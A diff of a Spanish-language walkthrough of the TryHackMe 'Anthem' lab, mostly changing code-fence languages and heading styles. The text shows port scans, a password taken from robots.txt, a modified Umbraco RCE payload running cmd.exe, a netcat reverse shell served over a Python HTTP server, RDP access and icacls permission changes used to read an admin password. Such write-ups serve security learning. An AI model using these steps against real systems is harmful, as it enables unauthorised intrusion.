@@ -3,6 +3,7 @@ layout      : post
 title       : "TryHackMe - Anthem"
 image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_gif.gif
 category    : [ thm ]
+tags        : [ CMS, RDP, icacls ]
 ---
 Máquina Windows nivel fácil. Jugaremos mucho a encontrar cosas en la web, caeremos en un Rabbit Hole con Umbraco (lindo, aprendimos bastante de esto) y accederemos remotamente a escritorios ajenos usando RDP.
 
@@ -34,7 +35,7 @@ El formato de `TryHackMe` es muy diferente al de `HackTheBox`, ya que algunas m�
 
 Realizaremos un escaneo de puertos para saber que servicios está corriendo la máquina.
 
-```sh
+```bash
 ❭ nmap -p- --open -v 10.10.87.37 -oG initScan
 ```
 
@@ -45,7 +46,7 @@ Realizaremos un escaneo de puertos para saber que servicios está corriendo la m
 | -v         | Permite ver en consola lo que va encontrando                                                             |
 | -oG        | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard      |
 
-```sh
+```bash
 ❭ cat initScan 
 # Nmap 7.80 scan initiated Thu Feb  4 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.87.37
 # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
@@ -63,7 +64,7 @@ Perfecto, tenemos:
 
 Hagamos nuestro escaneo de scripts y versiones en base a cada puerto, con ello obtenemos informacion mas detallada de cada servicio:
 
-```sh
+```bash
 ❭ nmap -p **,**** -sC -sV 10.10.87.37 -oN portScan
 ```
 
@@ -74,7 +75,7 @@ Hagamos nuestro escaneo de scripts y versiones en base a cada puerto, con ello o
 | -sV       | Nos permite ver la versión del servicio                |
 | -oN       | Guarda el output en un archivo                         |
 
-```sh
+```bash
 ❭ cat portScan 
 # Nmap 7.80 scan initiated Thu Feb  4 25:25:25 2021 as: nmap -p **,**** -sC -sV -oN portScan 10.10.87.37
 Nmap scan report for 10.10.87.37
@@ -115,31 +116,31 @@ Empecemos a responder preguntas :P
 
 ...
 
-### • What port is for the web server?
+#### What port is for the web server?
 
 Bueno, como vimos anteriormente, esta sobre el puerto `**` (Igual por algún lado creo que se filtrara :P).
 
 ![anthem_page80](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_page80.png)
 
-### • What port is for remote desktop service?
+#### What port is for remote desktop service?
 
 También lo vimos en el puerto `****`.
 
-### • What is a possible password in one of the pages web crawlers check for?
+#### What is a possible password in one of the pages web crawlers check for?
 
 Enumerando (y fijándonos en el escaneo anterior) con `robots.txt` tenemos lo que parece ser una contraseña: `****************`.
 
 ![anthem_page80_robotsTXT](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_page80_robotsTXT.png)
 
-### • What CMS is the website using?
+#### What CMS is the website using?
 
 Apoyados en la imagen anterior (y también del escaneo) sabemos que está usando el CMS [Umbraco](https://es.wikipedia.org/wiki/Umbraco).
 
-### • What is the domain of the website?
+#### What is the domain of the website?
 
 Por varios sitios (y en el escaneo :P :P) vemos el dominio `anthem.com`.
 
-### • What's the name of the Administrator
+#### What's the name of the Administrator
 
 Acá usando la ayuda que nos brinda, indica que debemos buscar :O, pero ni idea... Después de leer atentamente, los compañeros de trabajo le dedican un poema al admin:
 
@@ -147,37 +148,37 @@ Acá usando la ayuda que nos brinda, indica que debemos buscar :O, pero ni idea.
 
 Buscando en internet la frase, tenemos el nombre del autor, ese resulta ser el admin (:(
 
-### • Can we find find the email address of the administrator?
+#### Can we find find the email address of the administrator?
 
 Dado que vimos un correo, pero ese no es el indicado, podemos pensar que existe un patrón en los correos, teniendo el nombre podemos generar uno:
 
-* Correo que encontramos pero no es: `JD@anthem.com`.
-* Correo generado con el patron (iniciales del nombre): `**@anthem.com`.
+* Correo que encontramos pero no es: **JD@anthem.com**.
+* Correo generado con el patron (iniciales del nombre): ****@anthem.com**.
 
 ...
 
 ## Spot Flags [#](#spot-flags) {#spot-flags}
 
-```
+```bash
 Our beloved admin left some flags behind that 
 we require to gather before we proceed to the next task..
 ```
 
 Recorriendo la pagina, vemos algunas banderas en formato CTF, tales como `HTB{...}`, encontremoslas.
 
-### • What is flag 1?
+#### What is flag 1?
 
 ![anthem_page80_flag1](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_page80_flag1.png)
 
-### • What is flag 2?
+#### What is flag 2?
 
 ![anthem_page80_flag2](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_page80_flag2.png)
 
-### • What is flag 3?
+#### What is flag 3?
 
 ![anthem_page80_flag3](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_page80_flag3.png)
 
-### • What is flag 4?
+#### What is flag 4?
 
 ![anthem_page80_flag4](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_page80_flag4.png)
 
@@ -185,7 +186,7 @@ Recorriendo la pagina, vemos algunas banderas en formato CTF, tales como `HTB{..
 
 ## Final Stage [#](#final-stage) {#final-stage}
 
-```
+```bash
 Let's get into the box using the intel we gathered.
 ```
 
@@ -214,7 +215,7 @@ Recorriendo la página, podemos encontrar la versión del software, en este caso
 
 Bien, descargándolo y viendo el código, debemos modificar algunas líneas, tales como:
 
-* login: el usuario (email)
+* login: el usuario (email).
 * password: pues la password :P
 * host: donde está alojado el CMS `Umbraco` (IP de la máquina).
 
@@ -261,11 +262,11 @@ xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
  </xsl:template> </xsl:stylesheet> ';
 ```
 
-* [How works `startInfo.FileName` and `startInfo.Arguments`](https://stackoverflow.com/questions/7160187/standardoutput-readtoend-hangs).
+* [How works **startInfo.FileName** and **startInfo.Arguments**](https://stackoverflow.com/questions/7160187/standardoutput-readtoend-hangs).
 
 En la respuesta tenemos:
 
-```sh
+```bash
 nada u.u
 ```
 
@@ -273,9 +274,9 @@ Básicamente buscando en internet, tenemos que debemos agregarlo algo a la caden
 
 En `Stack Overflow` alguien agrego que usar `/c` al inicio de la cadena le indica a la consola que debe cerrarse apenas ejecute el comando. Probémoslo:
 
-* [How to pass mult args in `proc.StartInfo`](https://stackoverflow.com/questions/15061854/how-to-pass-multiple-arguments-in-processstartinfo#answer-15062027).
+* [How to pass mult args in **proc.StartInfo**](https://stackoverflow.com/questions/15061854/how-to-pass-multiple-arguments-in-processstartinfo#answer-15062027).
 
-```sh
+```bash
 ...
 proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = "/c whoami";\
 ...
@@ -301,7 +302,7 @@ proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = @"/c dir ..\..\.
 
 ▸ Ponernos en escucha donde tenemos el binario `nc`:
 
-```sh
+```bash
 ❭ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
@@ -328,7 +329,7 @@ Nice, no sé por qué solo se muestra nuestro binario, pero bueno, sabemos que e
 
 ▸ Nos ponemos en escucha:
 
-```sh
+```bash
 ❭ nc -lvp 4433
 listening on [any] 4433 ...
 ```
@@ -347,7 +348,7 @@ Perfectooooooooooooooooooo, tamos dentro pai (:
 
 Enumerando usuarios tenemos uno conocido:
 
-```
+```powershell
 c:\>net user
 
 User accounts for \\
@@ -383,11 +384,11 @@ Estando dentro (supongo que no me cargo el fondo de pantalla :P):
 
 ![anthem_bash_remminaDesktop](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_remminaDesktop.png)
 
-### • Gain initial access to the machine, what is the contents of user.txt?
+#### Gain initial access to the machine, what is the contents of user.txt?
 
 ![anthem_bash_remminaDesktop_user](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_remminaDesktop_user.png)
 
-### • Can we spot the admin password?
+#### Can we spot the admin password?
 
 Enumerando la máquina, encontramos un folder oculto en la raiz del sistema.
 
@@ -399,7 +400,7 @@ Dentro tenemos un archivo, pero que al intentar abrilo, no nos deja por falta de
 
 Si revisamos el `owner` del archivo con el comando `dir /q`, vemos que somos nosotros, podemos usar `icacls` para validar que permisos tenemos sobre el archivo:
 
-```
+```powershell
 c:\backup>icacls restore.txt
 restore.txt
 Successfully processed 1 files; Failed processing 0 files
@@ -409,11 +410,11 @@ Bien, pues siendo los propietarios del archivo podemos cambiarle los permisos, i
 
 ![anthem_bash_remminaDesktop_backup_restoreTXT_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_remminaDesktop_backup_restoreTXT_done.png)
 
-* [Info sobre `ICACLS` y gestion de permisos.](https://www.smythsys.es/11828/icacls-listar-los-permisos-de-directorios-en-windows-y-ver-a-que-carpetas-puede-acceder-un-usuario/)
+* [Info sobre **ICACLS** y gestion de permisos](https://www.smythsys.es/11828/icacls-listar-los-permisos-de-directorios-en-windows-y-ver-a-que-carpetas-puede-acceder-un-usuario/).
 
 Perfecto, tenemos una string que parece una contraseña :P
 
-### • Escalate your privileges to root, what is the contents of root.txt?
+#### Escalate your privileges to root, what is the contents of root.txt?
 
 Migramos al usuario `Administrator` y tenemos:
 
